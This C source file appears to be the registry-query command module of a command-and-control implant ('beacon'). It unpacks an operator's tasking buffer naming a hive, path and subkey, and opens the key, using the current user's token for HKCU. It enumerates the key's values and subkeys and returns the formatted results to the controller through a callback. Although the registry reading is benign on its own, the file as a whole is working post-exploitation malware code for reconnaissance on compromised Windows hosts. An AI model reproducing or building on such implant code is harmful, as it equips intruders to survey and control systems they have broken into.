#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "inject.h"
#include "tokens.h"
#include "bformat.h"

HKEY reg_resolve_hive(short hive) {
	switch (hive) {
	case 0:
		return HKEY_LOCAL_MACHINE;
	case 1:
		return HKEY_CLASSES_ROOT;
	case 2:
		return HKEY_CURRENT_CONFIG;
	case 3:
		return HKEY_CURRENT_USER;
	case 4:
		return HKEY_USERS;
	}

	return INVALID_HANDLE_VALUE;
}

void _reg_query(HKEY hive, char * path, char * subkey, DWORD flags, char * buffer, int max, formatp * builder) {
	HKEY child;
	DWORD index, x, next;
	DWORD type;
	datap parser;
	char * name_buffer;
	char * valu_buffer;
	DWORD szName;
	DWORD szValu;
	DWORD result;
	BOOL  filter;

	/* do we want to filter by subkey? */
	filter = strlen(subkey) > 0 ? TRUE : FALSE;

	/* split up the buffer passed in from above */
	data_init(&parser, buffer, max);
	name_buffer = data_ptr(&parser, max / 2);
	valu_buffer = data_ptr(&parser, max / 2);

	/* open the path */
	result = RegOpenKeyEx(hive, path, 0, KEY_READ | flags, &child);
	if (result != ERROR_SUCCESS) {
		/* do an error */
		post_error_d(0x3f, result);
		return;
	}

	/* enumerate our values */
	for (index = 0; TRUE; index++) {
		/* clear our buffers */
		szName = max / 8;
		szValu = max / 2;
		memset(name_buffer, 0, szName);
		memset(valu_buffer, 0, szValu);

		/* do our query, if it fails, exit this loop */
		result = RegEnumValue(child, index, name_buffer, &szName, NULL, &type, valu_buffer, &szValu);
		if (result == ERROR_MORE_DATA)
			continue;
		if (result != ERROR_SUCCESS)
			break;

		/* check our filter, please */
		if (filter && strcmp(name_buffer, subkey) != 0)
			continue;

		/* get our name in there */
		bformat_printf(builder, "%-24s ", name_buffer);

		/* now do our value */
		switch (type) {
			case REG_SZ:
			case REG_EXPAND_SZ:
			case REG_MULTI_SZ:
				bformat_printf(builder, "%s\n", valu_buffer);
				break;
			case REG_DWORD:
				bformat_printf(builder, "%d\n", *((DWORD *)valu_buffer));
				break;
			case REG_BINARY:
				/* note--the fall through to default is planned and on purpose */
				for (x = 0; x < szValu; x++) {
					next = valu_buffer[x] & 0xFF;
					if (next <= 15)
						bformat_printf(builder, "0%x", next);
					else
						bformat_printf(builder, "%x", next);
				}
			default:
				bformat_printf(builder, "\n");
		}
	}

	/* enumerate our keys */
	for (index = 0; !filter; index++) {
		/* clear our buffers */
		szName = max / 8;
		memset(name_buffer, 0, szName);

		/* do our query, if it fails, exit this loop */
		result = RegEnumKey(child, index, name_buffer, szName);
		if (result != ERROR_SUCCESS)
			break;

		/* post this key/value pair */
		bformat_printf(builder, "%s\\\n", name_buffer);
	}

	RegCloseKey(child);
}

/* deal with HKCU and tokens, please */
void reg_query(HKEY hive, char * path, char * subkey, DWORD flags, char * buffer, int max, formatp * builder) {
	HKEY real;
	if (hive == HKEY_CURRENT_USER) {
		RegOpenCurrentUser(KEY_READ | flags, &real);
		_reg_query(real, path, subkey, flags, buffer, max, builder);
		RegCloseKey(real);
	}
	else {
		_reg_query(hive, path, subkey, flags, buffer, max, builder);
	}
}

void command_reg_query(char * buffer, int length, void(*callback)(char * buffer, int length, int type)) {
	datap  parser;
	formatp builder;
	WORD   flags;
	WORD   hive;
	char * path;
	char * subkey;
	char * result;
	datap * local;

	/* allocate memory for our builder */
	bformat_init(&builder, 128 * 1024);

	/* allocate memory we need */
	local  = data_alloc(1024 * 130);
	path   = data_ptr(local, 1024);
	subkey = data_ptr(local, 1024);
	result = data_ptr(local, 128 * 1024);

	/* init our parser */
	data_init(&parser, buffer, length);
	flags = data_short(&parser);
	hive = data_short(&parser);
	data_string(&parser, path, 1024);
	data_string(&parser, subkey, 1024);

	/* resolve the hive constant to an HKEY, please */
	reg_query(reg_resolve_hive(hive), path, subkey, flags, result, 128 * 1024, &builder);

	/* callback */
	if (bformat_length(&builder) > 0)
		callback(bformat_string(&builder), bformat_length(&builder), CALLBACK_OUTPUT);

	/* free our memory */
	data_free(local);
	bformat_free(&builder);
}